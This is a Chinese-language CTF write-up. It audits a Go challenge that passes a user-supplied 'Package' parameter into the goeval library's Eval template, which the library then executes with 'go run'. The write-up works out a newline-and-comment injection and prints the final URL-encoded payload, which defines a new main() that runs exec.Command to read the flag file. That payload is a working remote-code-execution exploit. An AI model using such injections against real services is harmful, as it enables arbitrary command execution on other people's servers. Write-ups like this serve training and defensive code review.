# 0x00 题目描述

作为一个CTFer。口算md5那是基操。什么？你不能口算md5。算了。给你个计算器慢慢算。

# 0x01 解题思路

awdplus基本会给到源码，需要对源码进行代码审计，

# 0x02 代码

Main.go调用了一个goeval的库，代码逻辑很简单，通过两个参数传数据，`expression`被正则过滤，也没有被传入eval函数，不考虑，重点关注`Package`字段。

![image-20220722155126239](https://cdn.jsdelivr.net/gh/R1card0-tutu/R1card0-tutu@main/img/202207221551290.png)

跟进eval.go的`Eval`函数。

```go
func Eval(defineCode string, code string, imports ...string) (re []byte, err error) {
	var (
		tmp = `package main

%s

%s

func main() {
%s
}
`
		importStr string
		fullCode string
	 	newTmpDir = tempDir + dirSeparator + RandString(8)
	)
	if 0 < len(imports) {
		importStr = "import ("
		for _, item := range imports {
			if blankInd := strings.Index(item, " "); -1 < blankInd {
				importStr += fmt.Sprintf("\n %s \"%s\"", item[:blankInd], item[blankInd+1:])
			} else {
				importStr += fmt.Sprintf("\n\"%s\"", item)
			}
		}
		importStr += "\n)"
	}
	fullCode = fmt.Sprintf(tmp, importStr, defineCode, code)

	var codeBytes = []byte(fullCode)
	// 格式化输出的代码
	if formatCode, err := format.Source(codeBytes); nil == err {
		// 格式化失败，就还是用 content 吧
		codeBytes = formatCode
	}
//	fmt.Println(string(codeBytes))
	// 创建目录
	if err = os.Mkdir(newTmpDir, os.ModePerm); nil != err {
		return
	}
	defer os.RemoveAll(newTmpDir)
	// 创建文件
	tmpFile, err := os.Create(newTmpDir + dirSeparator + "main.go")
	if err != nil {
		return re, err
	}
	defer os.Remove(tmpFile.Name())
	// 代码写入文件
	tmpFile.Write(codeBytes)
	tmpFile.Close()
	// 运行代码
	cmd := exec.Command("go", "run", tmpFile.Name())
	res, err := cmd.CombinedOutput()
	return res, err
}
```

总结一下就是会格式化输入的数据，生成一个临时目录，生成man.go文件，然后执行go run main.go实现go动态执行的效果。

```
package main

%s

%s

func main() {
%s
}
```

POST输入数据

```
expression=1&Package=fmt
```

生成对应的main.go为

```go
package main

import (
 "fmt"
)



func main() {
fmt.Print(1)
}
```

所以能控制的参数只能是Package，Package被简单处理了下，如果有空格会在第一个空格截取加双引号，所以够构造的payload中不能出现空格。

尝试构造数据，将模板里面的func main注释掉

```
expression=*///&Package=fmt"/*%0a
```

后端生成

```
package main

import (
"fmt"/*
"
)



func main() {
fmt.Print(*///)
}
```

成功注释。只需要整一个exec的payload拼接进去就可以了

百度了下go的exec

```go
package main

import (
"fmt"
"log"
"os/exec"
)

func main() {
	cmd := exec.Command("ls", "-l", "/var/log/")
	out, err := cmd.CombinedOutput()
	if err != nil {
        fmt.Printf("combined out:\n%s\n", string(out))
		log.Fatalf("cmd.Run() failed with %s\n", err)
	}
	fmt.Printf("combined out:\n%s\n", string(out))
}
```

最终payload

```
expression=*///&Package=os/exec"%0a"fmt"%0a)%0afunc%09main()%09{%0a%09cmd:=exec.Command("cat","/ffffLAG")%0a%09out,_:=cmd.CombinedOutput()%0a%09fmt.Printf(string(out))%0a/*
```

成功执行系统命令

![image-20220722171440753](https://cdn.jsdelivr.net/gh/R1card0-tutu/R1card0-tutu@main/img/202207221714874.png)

